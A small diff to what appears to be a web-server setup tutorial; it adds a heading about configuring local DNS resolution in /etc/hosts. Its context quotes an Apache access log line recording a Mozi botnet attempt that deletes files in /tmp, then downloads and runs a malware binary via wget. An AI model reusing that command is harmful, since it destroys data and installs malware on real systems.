@@ -132,6 +132,8 @@ I opened console to each web server and ran the below command to be able to see 
 61.242.40.232 - - [21/May/2021:09:42:37 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 196 "-" "Hello, world"
 ```
 
+## Step 2: Optional Step - Configure Local DNS Names Resolution
+
  > *ubuntu@ip-172-31-28-70:~$ sudo su  
 root@ip-172-31-28-70:/home/ubuntu# vi /etc/hosts  
 root@ip-172-31-28-70:/home/ubuntu# cat /etc/hosts*
@@ -324,7 +326,6 @@ root@ip-172-31-28-70:/home/ubuntu# systemctl restart apache2*
 ...
 ...
 ```
-
 
 
 
